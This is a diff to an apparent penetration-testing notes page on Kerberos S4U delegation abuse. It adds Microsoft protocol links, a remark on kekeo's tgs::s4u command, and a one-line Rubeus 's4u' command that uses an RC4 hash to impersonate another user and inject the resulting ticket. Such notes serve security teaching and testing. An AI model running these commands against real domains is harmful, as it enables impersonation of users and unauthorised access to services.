@@ -10,7 +10,11 @@
 
 {% embed url="https://github.com/gentilkiwi/kekeo" %}
 
-3. **S4U2self and S4U2proxy**
+3. **Service for User (S4U)**
+
+{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94" %}
+
+4. **S4U2self and S4U2proxy**
 
 {% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13" %}
 
@@ -40,6 +44,8 @@ C:\> rubeus.exe asktgs /ticket:<ticket> /service:<servicename>
 ```
 kekeo # tgs::s4u /tgt:<path_to_TGT> /user:<username> /service:<servicename>
 ```
+
+> The `kekeo` command listed above essentially performs the **S4U2self** and **S4U2proxy** steps that can be achieved with `rubeus` (refer below).
 
 {% embed url="https://github.com/GhostPack/Rubeus?tab=readme-ov-file#s4u" %}
 
@@ -89,11 +95,10 @@ C:\> rubeus.exe ptt /ticket:TGS
 
 or by supplying the `/ptt` flag to the s4u command.
 
+#### C. Combining all steps: TGT request, S4U2self process, S4U2proxy execution and pass-the-ticket (injection of  the final ticket)
 
-
-{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94" %}
-
-
-
-
-
+{% code overflow="wrap" %}
+```powershell
+C:\> rubeus.exe s4u /user:<username> /rc4:<rc4_hash> /impersonateuser:<user_to_impersonate> /msdsspn:<SPN> /ptt
+```
+{% endcode %}
